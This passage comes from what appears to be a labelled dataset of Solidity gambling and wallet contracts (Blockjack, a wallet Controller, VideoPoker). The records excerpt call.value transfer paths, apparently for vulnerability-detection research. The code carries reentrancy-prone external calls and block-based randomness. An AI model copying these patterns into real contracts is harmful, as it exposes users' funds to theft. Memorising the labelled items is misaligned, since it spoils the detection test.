{ forceStand(self); if (!tick(self)) throw; } } function forceStand(Game storage self) { uint256 currentActionBlock = self.actionBlock; playerDecision(self, GameState.Stand); self.actionBlock = currentActionBlock; } function canDoubleDown(Game storage self) returns (bool) { if (self.playerCards.length > 2) return false; uint8 totalPlayer = countHand(self.playerCards); if (totalPlayer < 9 || totalPlayer > 11) return false; if (msg.value != self.bet) return false; } function playerDecision(Game storage self, GameState decision)  { if (self.state != GameState.Waiting) throw; if (decision != GameState.Hit && decision != GameState.Stand) throw; self.state = decision; self.actionBlock = block.number; } function dealInitialCards(Game storage self) private { self.playerCards.push(self.deck.getCard(self.actionBlock)); self.houseCards.push(self.deck.getCard(self.actionBlock)); self.playerCards.push(self.deck.getCard(self.actionBlock)); self.state = GameState.Waiting; } function dealHitCard(Game storage self) private { self.playerCards.push(self.deck.getCard(self.actionBlock)); self.state = GameState.Waiting; } function dealHouseCards(Game storage self) private { self.houseCards.push(self.deck.getCard(self.actionBlock)); if (countHand(self.houseCards) < houseLimit) dealHouseCards(self); } function endGame(Game storage self, GameResult result) { self.result = result; self.state = GameState.Finished; self.payout = payoutForResult(self.result, self.bet); closeGame(self); } function closeGame(Game storage self) private { if (self.closed) throw; if (self.state != GameState.Finished) throw; self.closed = true; if (self.payout > 0) { if (!self.player.send(self.payout)) throw; } } function payoutForResult(GameResult result, uint256 bet) private returns (uint256) { if (result == GameResult.PlayerNatural) return bet * 5 / 2; if (result == GameResult.Player) return bet * 2; if (result == GameResult.Tie) return bet; return 0; } function countHand(uint8[] memory hand)  returns (uint8) { uint8[] memory possibleSums = new uint8[](1); for (uint i = 0; i < hand.length; i++) { uint8 value = hand[i].blackjackValue(); uint l = possibleSums.length; for (uint j = 0; j < l; j++) { possibleSums[j] += value; if (value == 1) { possibleSums = appendArray(possibleSums, possibleSums[j] + 10); } } } return bestSum(possibleSums); } function bestSum(uint8[] possibleSums)  returns (uint8 bestSum) { bestSum = 50; for (uint i = 0; i < possibleSums.length; i++) { if (compareHands(bestSum, possibleSums[i]) == ComparaisonResult.Second) { bestSum = possibleSums[i]; } } return; } function appendArray(uint8[] memory array, uint8 n)  returns (uint8[] memory) { uint8[] memory newArray = new uint8[](array.length + 1); for (uint8 i = 0; i < array.length; i++) { newArray[i] = array[i]; } newArray[array.length] = n; return newArray; } function compareHands(uint8 a, uint8 b)  returns (ComparaisonResult) { if (a <= target && b <= target) { if (a > b) return ComparaisonResult.First; if (a < b) return ComparaisonResult.Second; } if (a > target && b > target) { if (a < b) return ComparaisonResult.First; if (a > b) return ComparaisonResult.Second; } if (a > target) return ComparaisonResult.Second; if (b > target) return ComparaisonResult.First; return ComparaisonResult.Tie; } } contract Blockjack { AbstractBlockjackLogs blockjacklogs; using GameLib for GameLib.Game; GameLib.Game[] games; mapping (address => uint256) public currentGame; bool contractCleared; uint256 public minBet = 50 finney; uint256 public maxBet = 500 finney; bool public allowsNewGames = false; uint256 public maxBlockActions = 10; mapping (uint256 => uint256) blockActions; address public DX = 0x296Ae1d2D9A8701e113EcdF6cE986a4a7D0A6dC5; address public DEV = 0xBC4343B11B7cfdd6dD635f61039b8a66aF6E73Bb; address public ADMIN_CONTRACT; uint256 public BANKROLL_LOCK_PERIOD = 30 days; uint256 public bankrollLockedUntil; uint256 public profitsLockedUntil; uint256 public initialBankroll; uint256 public currentBankroll; mapping (address => bool) public isOwner; modifier onlyOwner { if (!isOwner[msg.sender]) throw; _; } modifier only(address x) { if (msg.sender != x) throw; _; } modifier onlyPlayer(uint256 gameID) { if (msg.sender != games[gameID].player) throw; _; } modifier blockActionProtected { blockActions[block.number] += 1; if (blockActions[block.number] > maxBlockActions) throw; _; } function Blockjack(address _admin_contract, address _logs_contract) { ADMIN_CONTRACT = _admin_contract; blockjacklogs = AbstractBlockjackLogs(_logs_contract); games.length += 1; games[0].init(0); games[0].player = this; setupTrustedAccounts(); } function () payable { startGame(); } function startGame() blockActionProtected payable { if (!allowsNewGames) throw; if (msg.value < minBet) throw; if (msg.value > maxBet) throw; uint256 currentGameId = currentGame[msg.sender]; if (games.length > currentGameId) { GameLib.Game openedGame = games[currentGameId]; if (openedGame.player == msg.sender && !openedGame.closed) { if (!openedGame.tick()) throw; if (!openedGame.closed) throw; recordEndedGame(currentGameId); } } uint256 newGameID = games.length; games.length += 1; games[newGameID].init(newGameID); currentGame[msg.sender] = newGameID; tickRequiredLog(games[newGameID]); } function hit(uint256 gameID) onlyPlayer(gameID) blockActionProtected { GameLib.Game game = games[gameID]; if (!game.tick()) throw; game.playerDecision(GameLib.GameState.Hit); tickRequiredLog(game); } function doubleDown(uint256 gameID) onlyPlayer(gameID) blockActionProtected payable { GameLib.Game game = games[gameID]; if (!game.tick()) throw; game.playerDecision(GameLib.GameState.DoubleDown); tickRequiredLog(game); } function stand(uint256 gameID) onlyPlayer(gameID) blockActionProtected { GameLib.Game game = games[gameID]; if (!game.tick()) throw; game.playerDecision(GameLib.GameState.Stand); tickRequiredLog(game); } function gameTick(uint256 gameID) blockActionProtected { GameLib.Game openedGame = games[gameID]; if (openedGame.closed) throw; if (!openedGame.tick()) throw; if (openedGame.closed) recordEndedGame(gameID); } function recordEndedGame(uint gameID) private { GameLib.Game openedGame = games[gameID]; if(currentBankroll + openedGame.bet > openedGame.payout){ currentBankroll = currentBankroll + openedGame.bet - openedGame.payout; } blockjacklogs.recordLog( openedGame.gameID, openedGame.player, uint(openedGame.result), openedGame.payout, GameLib.countHand(openedGame.playerCards), GameLib.countHand(openedGame.houseCards) ); } function tickRequiredLog(GameLib.Game storage game) private { blockjacklogs.tickRequiredLog(game.gameID, game.player, game.actionBlock); } function gameState(uint i) constant returns (uint8[], uint8[], uint8, uint8, uint256, uint256, uint8, uint8, bool, uint256) { GameLib.Game game = games[i]; return ( game.houseCards, game.playerCards, GameLib.countHand(game.houseCards), GameLib.countHand(game.playerCards), game.bet, game.payout, uint8(game.state), uint8(game.result), game.closed, game.actionBlock ); } function setupTrustedAccounts() internal { isOwner[DX] = true; isOwner[DEV] = true; isOwner[ADMIN_CONTRACT] = true; } function changeDev(address newDev) only(DEV) { isOwner[DEV] = false; DEV = newDev; isOwner[DEV] = true; } function changeDX(address newDX) only(DX) { isOwner[DX] = false; DX = newDX; isOwner[DX] = true; } function changeAdminContract(address _new_admin_contract) only(ADMIN_CONTRACT) { isOwner[ADMIN_CONTRACT] = false; ADMIN_CONTRACT = _new_admin_contract; isOwner[ADMIN_CONTRACT] = true; } function setSettings(uint256 _min, uint256 _max, uint256 _maxBlockActions) only(ADMIN_CONTRACT) { minBet = _min; maxBet = _max; maxBlockActions = _maxBlockActions; } function registerOwner(address _new_watcher) only(ADMIN_CONTRACT) { isOwner[_new_watcher] = true; } function removeOwner(address _old_watcher) only(ADMIN_CONTRACT) { isOwner[_old_watcher] = false; } function stopBlockjack() onlyOwner { allowsNewGames = false; } function startBlockjack() only(ADMIN_CONTRACT) { allowsNewGames = true; } function addBankroll() only(DX) payable { initialBankroll += msg.value; currentBankroll += msg.value; } function remainingBankroll() constant returns (uint256) { return currentBankroll > initialBankroll ? initialBankroll : currentBankroll; } function removeBankroll() only(DX) { if (initialBankroll > currentBankroll - 5 ether && bankrollLockedUntil > now) throw; stopBlockjack(); if (currentBankroll > initialBankroll) { if (!DEV.send(currentBankroll - initialBankroll)) throw; } suicide(DX); contractCleared = true; } function migrateBlockjack() only(ADMIN_CONTRACT) { stopBlockjack(); if (currentBankroll > initialBankroll) { if (!ADMIN_CONTRACT.call.value(currentBankroll - initialBankroll)()) throw; } suicide(DX); } function shareProfits() onlyOwner { if (profitsLockedUntil > now) throw; if (currentBankroll <= initialBankroll) throw; uint256 profit = currentBankroll - initialBankroll; if (!ADMIN_CONTRACT.call.value(profit)()) throw; currentBankroll -= profit; bankrollLockedUntil = now + BANKROLL_LOCK_PERIOD; profitsLockedUntil = bankrollLockedUntil + BANKROLL_LOCK_PERIOD; } } "}
{"sol name": "12182.sol", "label": 0, "first path": "function transferEther(address to, uint256 amount) public returns (bool) { require(msg.sender == owner); return to.call.value(amount)(); function() public payable {} contract Controller is ControllerStorage, Ownable, HasWorkers { event CreatedUserWallet(address _wallet); event WithdrawEth(address _wallet, address _to, uint256 _amount); event WithdrawToken(address _token, address _wallet, address _to, uint256 _amount); event ChangedForward(address _old, address _new, address _operator); constructor() public { setForward(msg.sender); function executeTransaction(address destination, uint256 value, bytes memory _bytes) public onlyOwner returns (bool) { return destination.call.value(value)(_bytes); function withdrawEthBatch(Wallet[] wallets) public onlyWorker returns (bool) { uint256 size = wallets.length; uint256 balance; Wallet wallet; for (uint256 i = 0; i < size; i++) { wallet = wallets[i]; balance = wallet.balance; if (wallet.transferEther(this, balance)) { emit WithdrawEth(wallet, forward, balance); forward.call.value(address(this).balance)(); return true; ", "second path": "function transferEther(address to, uint256 amount) public returns (bool) { require(msg.sender == owner); return to.call.value(amount)(); function() public payable {} contract Controller is ControllerStorage, Ownable, HasWorkers { event CreatedUserWallet(address _wallet); event WithdrawEth(address _wallet, address _to, uint256 _amount); event WithdrawToken(address _token, address _wallet, address _to, uint256 _amount); event ChangedForward(address _old, address _new, address _operator); constructor() public { setForward(msg.sender); function executeTransaction(address destination, uint256 value, bytes memory _bytes) public onlyOwner returns (bool) { return destination.call.value(value)(_bytes); function withdrawEthBatch(Wallet[] wallets) public onlyWorker returns (bool) { uint256 size = wallets.length; uint256 balance; Wallet wallet; for (uint256 i = 0; i < size; i++) { wallet = wallets[i]; balance = wallet.balance; if (wallet.transferEther(this, balance)) { emit WithdrawEth(wallet, forward, balance); forward.call.value(address(this).balance)(); return true; ", "third path": "function transferEther(address to, uint256 amount) public returns (bool) { require(msg.sender == owner); return to.call.value(amount)(); function() public payable {} contract Controller is ControllerStorage, Ownable, HasWorkers { event CreatedUserWallet(address _wallet); event WithdrawEth(address _wallet, address _to, uint256 _amount); event WithdrawToken(address _token, address _wallet, address _to, uint256 _amount); event ChangedForward(address _old, address _new, address _operator); constructor() public { setForward(msg.sender); function executeTransaction(address destination, uint256 value, bytes memory _bytes) public onlyOwner returns (bool) { return destination.call.value(value)(_bytes); function withdrawEthBatch(Wallet[] wallets) public onlyWorker returns (bool) { uint256 size = wallets.length; uint256 balance; Wallet wallet; for (uint256 i = 0; i < size; i++) { wallet = wallets[i]; balance = wallet.balance; if (wallet.transferEther(this, balance)) { emit WithdrawEth(wallet, forward, balance); forward.call.value(address(this).balance)(); return true; ", "long path": "pragma solidity ^0.4.23; contract Ownable { address public owner; modifier onlyOwner() { require(msg.sender == owner); _; } constructor() public { owner = msg.sender; } function setOwner(address _owner) public onlyOwner returns (bool) { require(_owner != address(0)); owner = _owner; return true; } } interface TokenHandler { function handleTokens(Token _token) public returns (bool); } contract HasWorkers is Ownable { mapping(address => uint256) private workerToIndex; address[] private workers; event AddedWorker(address _worker); event RemovedWorker(address _worker); constructor() public { workers.length++; } modifier onlyWorker() { require(isWorker(msg.sender)); _; } modifier workerOrOwner() { require(isWorker(msg.sender) || msg.sender == owner); _; } function isWorker(address _worker) public view returns (bool) { return workerToIndex[_worker] != 0; } function allWorkers() public view returns (address[] memory result) { result = new address[](workers.length - 1); for (uint256 i = 1; i < workers.length; i++) { result[i - 1] = workers[i]; } } function addWorker(address _worker) public onlyOwner returns (bool) { require(!isWorker(_worker)); uint256 index = workers.push(_worker) - 1; workerToIndex[_worker] = index; emit AddedWorker(_worker); return true; } function removeWorker(address _worker) public onlyOwner returns (bool) { require(isWorker(_worker)); uint256 index = workerToIndex[_worker]; address lastWorker = workers[workers.length - 1]; workerToIndex[lastWorker] = index; workers[index] = lastWorker; workers.length--; delete workerToIndex[_worker]; emit RemovedWorker(_worker); return true; } } contract ControllerStorage { address public walletsDelegate; address public controllerDelegate; address public forward; uint256 public createdWallets; mapping(bytes32 => bytes32) public gStorage; } contract WalletStorage { address public owner; } contract DelegateProxy { function delegatedFwd(address _dst, bytes _calldata) internal { assembly { let result := delegatecall(sub(gas, 10000), _dst, add(_calldata, 0x20), mload(_calldata), 0, 0) let size := returndatasize let ptr := mload(0x40) returndatacopy(ptr, 0, size) switch result case 0 { revert(ptr, size) } default { return(ptr, size) } } } } contract DelegateProvider { function getDelegate() public view returns (address delegate); } contract ControllerProxy is ControllerStorage, Ownable, HasWorkers, DelegateProvider, DelegateProxy { function getDelegate() public view returns (address delegate) { delegate = walletsDelegate; } function setWalletsDelegate(address _delegate) public onlyOwner returns (bool) { walletsDelegate = _delegate; return true; } function setControllerDelegate(address _delegate) public onlyOwner returns (bool) { controllerDelegate = _delegate; return true; } function() public payable { if (gasleft() > 2400) { delegatedFwd(controllerDelegate, msg.data); } } } contract Token { function transfer(address _to, uint _value) returns (bool success); function transferFrom(address _from, address _to, uint256 _value) returns (bool success); function allowance(address _owner, address _spender) constant returns (uint256 remaining); function approve(address _spender, uint256 _value) returns (bool success); function increaseApproval (address _spender, uint _addedValue) public returns (bool success); function balanceOf(address tokenOwner) public constant returns (uint balance); } contract WalletProxy is WalletStorage, DelegateProxy { event ReceivedETH(address from, uint256 amount); constructor() public { owner = msg.sender; } function() public payable { if (msg.value > 0) { emit ReceivedETH(msg.sender, msg.value); } if (gasleft() > 2400) { delegatedFwd(DelegateProvider(owner).getDelegate(), msg.data); } } } contract Wallet is WalletStorage { function transferERC20Token(Token token, address to, uint256 amount) public returns (bool) { require(msg.sender == owner); return token.transfer(to, amount); } function transferEther(address to, uint256 amount) public returns (bool) { require(msg.sender == owner); return to.call.value(amount)(); } function() public payable {} } contract Controller is ControllerStorage, Ownable, HasWorkers { event CreatedUserWallet(address _wallet); event WithdrawEth(address _wallet, address _to, uint256 _amount); event WithdrawToken(address _token, address _wallet, address _to, uint256 _amount); event ChangedForward(address _old, address _new, address _operator); constructor() public { setForward(msg.sender); } function executeTransaction(address destination, uint256 value, bytes memory _bytes) public onlyOwner returns (bool) { return destination.call.value(value)(_bytes); } function setForward(address _forward) public onlyOwner returns (bool) { emit ChangedForward(forward, _forward, msg.sender); forward = _forward; return true; } function createWallets(uint256 number) public onlyWorker returns (bool) { for (uint256 i = 0; i < number; i++) { emit CreatedUserWallet(new WalletProxy()); } createdWallets += number; return true; } function withdrawEth(Wallet wallet) public onlyWorker returns (bool result) { uint256 balance = address(wallet).balance; result = wallet.transferEther(forward, balance); if (result) { emit WithdrawEth(wallet, forward, balance); } } function withdrawEthBatch(Wallet[] wallets) public onlyWorker returns (bool) { uint256 size = wallets.length; uint256 balance; Wallet wallet; for (uint256 i = 0; i < size; i++) { wallet = wallets[i]; balance = wallet.balance; if (wallet.transferEther(this, balance)) { emit WithdrawEth(wallet, forward, balance); } } forward.call.value(address(this).balance)(); return true; } function withdrawERC20(Token token, Wallet wallet) public onlyWorker returns (bool result) { uint256 balance = token.balanceOf(wallet); result = wallet.transferERC20Token(token, forward, balance); if (result) { emit WithdrawToken(token, wallet, forward, balance); } TokenHandler(forward).handleTokens(token); } function withdrawERC20Batch(Token token, Wallet[] wallets) public onlyWorker returns (bool) { uint256 size = wallets.length; uint256 balance; Wallet wallet; for (uint256 i = 0; i < size; i++) { wallet = wallets[i]; balance = token.balanceOf(wallet); if (wallet.transferERC20Token(token, forward, balance)) { emit WithdrawToken(token, wallet, forward, balance); } } TokenHandler(forward).handleTokens(token); return true; } function() public payable {} } "}
{"sol name": "13952.sol", "label": 1, "first path": "function removeBankroll(uint _amount, string _callbackFn) public returns (uint _recalled) address _bankroller = msg.sender; uint _collateral = getCollateral(); uint _balance = address(this).balance; uint _available = _balance > _collateral ? _balance - _collateral : 0; if (_amount > _available) _amount = _available; _amount = ledger.subtract(_bankroller, _amount); bankroll = ledger.total(); if (_amount == 0) return; bytes4 _sig = bytes4(keccak256(_callbackFn)); require(_bankroller.call.value(_amount)(_sig)); emit BankrollRemoved(now, _bankroller, _amount, bankroll); return _amount; function sendProfits() public returns (uint _profits) int _p = profits(); if (_p <= 0) return; _profits = uint(_p); profitsSent += _profits; address _tr = getTreasury(); require(_tr.call.value(_profits)()); emit ProfitsSent(now, _tr, _profits); function _betFailure(string _msg, uint _bet, bool _doRefund) private if (_doRefund) require(msg.sender.call.value(_bet)()); emit BetFailure(now, msg.sender, _bet, _msg); function _uncreditUser(address _user, uint _amt) private if (_amt > credits[_user] || _amt == 0) _amt = credits[_user]; if (_amt == 0) return; vars.totalCredits -= uint88(_amt); credits[_user] -= _amt; require(_user.call.value(_amt)()); emit CreditsCashedout(now, _user, _amt); ", "second path": "function removeBankroll(uint _amount, string _callbackFn) public returns (uint _recalled) address _bankroller = msg.sender; uint _collateral = getCollateral(); uint _balance = address(this).balance; uint _available = _balance > _collateral ? _balance - _collateral : 0; if (_amount > _available) _amount = _available; _amount = ledger.subtract(_bankroller, _amount); bankroll = ledger.total(); if (_amount == 0) return; bytes4 _sig = bytes4(keccak256(_callbackFn)); require(_bankroller.call.value(_amount)(_sig)); emit BankrollRemoved(now, _bankroller, _amount, bankroll); return _amount; function sendProfits() public returns (uint _profits) int _p = profits(); if (_p <= 0) return; _profits = uint(_p); profitsSent += _profits; address _tr = getTreasury(); require(_tr.call.value(_profits)()); emit ProfitsSent(now, _tr, _profits); function _betFailure(string _msg, uint _bet, bool _doRefund) private if (_doRefund) require(msg.sender.call.value(_bet)()); emit BetFailure(now, msg.sender, _bet, _msg); function _uncreditUser(address _user, uint _amt) private if (_amt > credits[_user] || _amt == 0) _amt = credits[_user]; if (_amt == 0) return; vars.totalCredits -= uint88(_amt); credits[_user] -= _amt; require(_user.call.value(_amt)()); emit CreditsCashedout(now, _user, _amt); ", "third path": "function removeBankroll(uint _amount, string _callbackFn) public returns (uint _recalled) address _bankroller = msg.sender; uint _collateral = getCollateral(); uint _balance = address(this).balance; uint _available = _balance > _collateral ? _balance - _collateral : 0; if (_amount > _available) _amount = _available; _amount = ledger.subtract(_bankroller, _amount); bankroll = ledger.total(); if (_amount == 0) return; bytes4 _sig = bytes4(keccak256(_callbackFn)); require(_bankroller.call.value(_amount)(_sig)); emit BankrollRemoved(now, _bankroller, _amount, bankroll); return _amount; function sendProfits() public returns (uint _profits) int _p = profits(); if (_p <= 0) return; _profits = uint(_p); profitsSent += _profits; address _tr = getTreasury(); require(_tr.call.value(_profits)()); emit ProfitsSent(now, _tr, _profits); function _betFailure(string _msg, uint _bet, bool _doRefund) private if (_doRefund) require(msg.sender.call.value(_bet)()); emit BetFailure(now, msg.sender, _bet, _msg); function _uncreditUser(address _user, uint _amt) private if (_amt > credits[_user] || _amt == 0) _amt = credits[_user]; if (_amt == 0) return; vars.totalCredits -= uint88(_amt); credits[_user] -= _amt; require(_user.call.value(_amt)()); emit CreditsCashedout(now, _user, _amt); ", "long path": "pragma solidity ^0.4.23; interface IRegistry { function owner() external view returns (address _addr); function addressOf(bytes32 _name) external view returns (address _addr); } contract UsingRegistry { IRegistry private registry; modifier fromOwner(){ require(msg.sender == getOwner()); _; } constructor(address _registry) public { require(_registry != 0); registry = IRegistry(_registry); } function addressOf(bytes32 _name) internal view returns(address _addr) { return registry.addressOf(_name); } function getOwner() public view returns (address _addr) { return registry.owner(); } function getRegistry() public view returns (IRegistry _addr) { return registry; } } contract UsingAdmin is UsingRegistry { constructor(address _registry) UsingRegistry(_registry) public {} modifier fromAdmin(){ require(msg.sender == getAdmin()); _; } function getAdmin() public constant returns (address _addr) { return addressOf(\"ADMIN\"); } } interface ITreasury { function issueDividend() external returns (uint _profits); function profitsSendable() external view returns (uint _profits); } contract UsingTreasury is UsingRegistry { constructor(address _registry) UsingRegistry(_registry) public {} modifier fromTreasury(){ require(msg.sender == address(getTreasury())); _; } function getTreasury() public view returns (ITreasury) { return ITreasury(addressOf(\"TREASURY\")); } } contract Ledger { uint public total; struct Entry { uint balance; address next; address prev; } mapping (address => Entry) public entries; address public owner; modifier fromOwner() { require(msg.sender==owner); _; } constructor(address _owner) public { owner = _owner; } function add(address _address, uint _amt) fromOwner public { if (_address == address(0) || _amt == 0) return; Entry storage entry = entries[_address]; if (entry.balance == 0) { entry.next = entries[0x0].next; entries[entries[0x0].next].prev = _address; entries[0x0].next = _address; } total += _amt; entry.balance += _amt; } function subtract(address _address, uint _amt) fromOwner public returns (uint _amtRemoved) { if (_address == address(0) || _amt == 0) return; Entry storage entry = entries[_address]; uint _maxAmt = entry.balance; if (_maxAmt == 0) return; if (_amt >= _maxAmt) { total -= _maxAmt; entries[entry.prev].next = entry.next; entries[entry.next].prev = entry.prev; delete entries[_address]; return _maxAmt; } else { total -= _amt; entry.balance -= _amt; return _amt; } } function size() public view returns (uint _size) { Entry memory _curEntry = entries[0x0]; while (_curEntry.next > 0) { _curEntry = entries[_curEntry.next]; _size++; } return _size; } function balanceOf(address _address) public view returns (uint _balance) { return entries[_address].balance; } function balances() public view returns (address[] _addresses, uint[] _balances) { uint _size = size(); _addresses = new address[](_size); _balances = new uint[](_size); uint _i = 0; Entry memory _curEntry = entries[0x0]; while (_curEntry.next > 0) { _addresses[_i] = _curEntry.next; _balances[_i] = entries[_curEntry.next].balance; _curEntry = entries[_curEntry.next]; _i++; } return (_addresses, _balances); } } contract AddressSet { struct Entry { bool exists; address next; address prev; } mapping (address => Entry) public entries; address public owner; modifier fromOwner() { require(msg.sender==owner); _; } constructor(address _owner) public { owner = _owner; } function add(address _address) fromOwner public returns (bool _didCreate) { if (_address == address(0)) return; Entry storage entry = entries[_address]; if (entry.exists) return; else entry.exists = true; Entry storage HEAD = entries[0x0]; entry.next = HEAD.next; entries[HEAD.next].prev = _address; HEAD.next = _address; return true; } function remove(address _address) fromOwner public returns (bool _didExist) { if (_address == address(0)) return; Entry storage entry = entries[_address]; if (!entry.exists) return; entries[entry.prev].next = entry.next; entries[entry.next].prev = entry.prev; delete entries[_address]; return true; } function size() public view returns (uint _size) { Entry memory _curEntry = entries[0x0]; while (_curEntry.next > 0) { _curEntry = entries[_curEntry.next]; _size++; } return _size; } function has(address _address) public view returns (bool _exists) { return entries[_address].exists; } function addresses() public view returns (address[] _addresses) { uint _size = size(); _addresses = new address[](_size); uint _i = 0; Entry memory _curEntry = entries[0x0]; while (_curEntry.next > 0) { _addresses[_i] = _curEntry.next; _curEntry = entries[_curEntry.next]; _i++; } return _addresses; } } contract Bankrollable is UsingTreasury { uint public profitsSent; Ledger public ledger; uint public bankroll; AddressSet public whitelist; modifier fromWhitelistOwner(){ require(msg.sender == getWhitelistOwner()); _; } event BankrollAdded(uint time, address indexed bankroller, uint amount, uint bankroll); event BankrollRemoved(uint time, address indexed bankroller, uint amount, uint bankroll); event ProfitsSent(uint time, address indexed treasury, uint amount); event AddedToWhitelist(uint time, address indexed addr, address indexed wlOwner); event RemovedFromWhitelist(uint time, address indexed addr, address indexed wlOwner); constructor(address _registry) UsingTreasury(_registry) public { ledger = new Ledger(this); whitelist = new AddressSet(this); } function addToWhitelist(address _addr) fromWhitelistOwner public { bool _didAdd = whitelist.add(_addr); if (_didAdd) emit AddedToWhitelist(now, _addr, msg.sender); } function removeFromWhitelist(address _addr) fromWhitelistOwner public { bool _didRemove = whitelist.remove(_addr); if (_didRemove) emit RemovedFromWhitelist(now, _addr, msg.sender); } function () public payable {} function addBankroll() public payable { require(whitelist.size()==0 || whitelist.has(msg.sender)); ledger.add(msg.sender, msg.value); bankroll = ledger.total(); emit BankrollAdded(now, msg.sender, msg.value, bankroll); } function removeBankroll(uint _amount, string _callbackFn) public returns (uint _recalled) { address _bankroller = msg.sender; uint _collateral = getCollateral(); uint _balance = address(this).balance; uint _available = _balance > _collateral ? _balance - _collateral : 0; if (_amount > _available) _amount = _available; _amount = ledger.subtract(_bankroller, _amount); bankroll = ledger.total(); if (_amount == 0) return; bytes4 _sig = bytes4(keccak256(_callbackFn)); require(_bankroller.call.value(_amount)(_sig)); emit BankrollRemoved(now, _bankroller, _amount, bankroll); return _amount; } function sendProfits() public returns (uint _profits) { int _p = profits(); if (_p <= 0) return; _profits = uint(_p); profitsSent += _profits; address _tr = getTreasury(); require(_tr.call.value(_profits)()); emit ProfitsSent(now, _tr, _profits); } function getCollateral() public view returns (uint _amount); function getWhitelistOwner() public view returns (address _addr); function profits() public view returns (int _profits) { int _balance = int(address(this).balance); int _threshold = int(bankroll + getCollateral()); return _balance - _threshold; } function profitsTotal() public view returns (int _profits) { return int(profitsSent) + profits(); } function bankrollAvailable() public view returns (uint _amount) { uint _balance = address(this).balance; uint _bankroll = bankroll; uint _collat = getCollateral(); if (_balance <= _collat) return 0; else if (_balance < _collat + _bankroll) return _balance - _collat; else return _bankroll; } function bankrolledBy(address _addr) public view returns (uint _amount) { return ledger.balanceOf(_addr); } function bankrollerTable() public view returns (address[], uint[]) { return ledger.balances(); } } contract VideoPokerUtils { uint constant HAND_UNDEFINED = 0; uint constant HAND_RF = 1; uint constant HAND_SF = 2; uint constant HAND_FK = 3; uint constant HAND_FH = 4; uint constant HAND_FL = 5; uint constant HAND_ST = 6; uint constant HAND_TK = 7; uint constant HAND_TP = 8; uint constant HAND_JB = 9; uint constant HAND_HC = 10; uint constant HAND_NOT_COMPUTABLE = 11; function getHand(uint256 _hash) public pure returns (uint32) { return uint32(getCardsFromHash(_hash, 5, 0)); } function drawToHand(uint256 _hash, uint32 _hand, uint _draws) public pure returns (uint32) { assert(_draws <= 31); assert(_hand != 0 || _draws == 31); if (_draws == 0) return _hand; if (_draws == 31) return uint32(getCardsFromHash(_hash, 5, handToBitmap(_hand))); uint _newMask; for (uint _i=0; _i<5; _i++) { if (_draws & 2**_i == 0) continue; _newMask |= 63 * (2**(6*_i)); } uint _discardMask = ~_newMask & (2**31-1); uint _newHand = getCardsFromHash(_hash, 5, handToBitmap(_hand)); _newHand &= _newMask; _newHand |= _hand & _discardMask; return uint32(_newHand); } function getHandRank(uint32 _hand) public pure returns (uint) { if (_hand == 0) return HAND_NOT_COMPUTABLE; uint _card; uint[] memory _valCounts = new uint[](13); uint[] memory _suitCounts = new uint[](5); uint _pairVal; uint _minNonAce = 100; uint _maxNonAce = 0; uint _numPairs; uint _maxSet; bool _hasFlush; bool _hasAce; uint _i; uint _val; for (_i=0; _i<5; _i++) { _card = readFromCards(_hand, _i); if (_card > 51) return HAND_NOT_COMPUTABLE; _val = _card % 13; _valCounts[_val]++; _suitCounts[_card/13]++; if (_suitCounts[_card/13] == 5) _hasFlush = true; if (_val == 0) { _hasAce = true; } else { if (_val < _minNonAce) _minNonAce = _val; if (_val > _maxNonAce) _maxNonAce = _val; } if (_valCounts[_val] == 2) { if (_numPairs==0) _pairVal = _val; _numPairs++; } else if (_valCounts[_val] == 3) { _maxSet = 3; } else if (_valCounts[_val] == 4) { _maxSet = 4; } } if (_numPairs > 0){ if (_maxSet==4) return HAND_FK; if (_maxSet==3 && _numPairs==2) return HAND_FH; if (_maxSet==3) return HAND_TK; if (_numPairs==2) return HAND_TP; if (_numPairs == 1 && (_pairVal >= 10 || _pairVal==0)) return HAND_JB; return HAND_HC; } bool _hasStraight = _hasAce ? _maxNonAce == 4 || _minNonAce == 9 : _maxNonAce - _minNonAce == 4; if (_hasStraight && _hasFlush && _minNonAce==9) return HAND_RF; if (_hasStraight && _hasFlush) return HAND_SF; if (_hasFlush) return HAND_FL; if (_hasStraight) return HAND_ST; return HAND_HC; } function handToCards(uint32 _hand) public pure returns (uint8[5] _cards) { uint32 _mask; for (uint _i=0; _i<5; _i++){ _mask = uint32(63 * 2**(6*_i)); _cards[_i] = uint8((_hand & _mask) / (2**(6*_i))); } } function readFromCards(uint _cards, uint _index) internal pure returns (uint) { uint _offset = 2**(6*_index); uint _oneBits = 2**6 - 1; return (_cards & (_oneBits * _offset)) / _offset; } function handToBitmap(uint32 _hand) internal pure returns (uint _bitmap) { if (_hand == 0) return 0; uint _mask; uint _card; for (uint _i=0; _i<5; _i++){ _mask = 63 * 2**(6*_i); _card = (_hand & _mask) / (2**(6*_i)); _bitmap |= 2**_card; } } function getCardsFromHash(uint256 _hash, uint _numCards, uint _usedBitmap) internal pure returns (uint _cards) { if (_numCards == 0) return; uint _cardIdx = 0; uint _card; uint _usedMask; while (true) { _card = _hash % 52; _usedMask = 2**_card; if (_usedBitmap & _usedMask == 0) { _cards |= (_card * 2**(_cardIdx*6)); _usedBitmap |= _usedMask; _cardIdx++; if (_cardIdx == _numCards) return _cards; } _hash = uint256(keccak256(_hash)); } } } contract VideoPoker is VideoPokerUtils, Bankrollable, UsingAdmin { struct Game { uint32 userId; uint64 bet; uint16 payTableId; uint32 iBlock; uint32 iHand; uint8 draws; uint32 dBlock; uint32 dHand; uint8 handRank; } struct Vars { uint32 curId; uint64 totalWageredGwei; uint32 curUserId; uint128 empty1; uint64 totalWonGwei; uint88 totalCredits; uint8 empty2; } struct Settings { uint64 minBet; uint64 maxBet; uint16 curPayTableId; uint16 numPayTables; uint32 lastDayAdded; } Settings settings; Vars vars; mapping(uint32 => Game) public games; mapping(address => uint) public credits; mapping (address => uint32) public userIds; mapping (uint32 => address) public userAddresses; mapping(uint16=>uint16[12]) payTables; uint8 public constant version = 2; uint8 constant WARN_IHAND_TIMEOUT = 1; uint8 constant WARN_DHAND_TIMEOUT = 2; uint8 constant WARN_BOTH_TIMEOUT = 3; event Created(uint time); event PayTableAdded(uint time, address admin, uint payTableId); event SettingsChanged(uint time, address admin); event BetSuccess(uint time, address indexed user, uint32 indexed id, uint bet, uint payTableId); event BetFailure(uint time, address indexed user, uint bet, string msg); event DrawSuccess(uint time, address indexed user, uint32 indexed id, uint32 iHand, uint8 draws, uint8 warnCode); event DrawFailure(uint time, address indexed user, uint32 indexed id, uint8 draws, string msg); event FinalizeSuccess(uint time, address indexed user, uint32 indexed id, uint32 dHand, uint8 handRank, uint payout, uint8 warnCode); event FinalizeFailure(uint time, address indexed user, uint32 indexed id, string msg); event CreditsAdded(uint time, address indexed user, 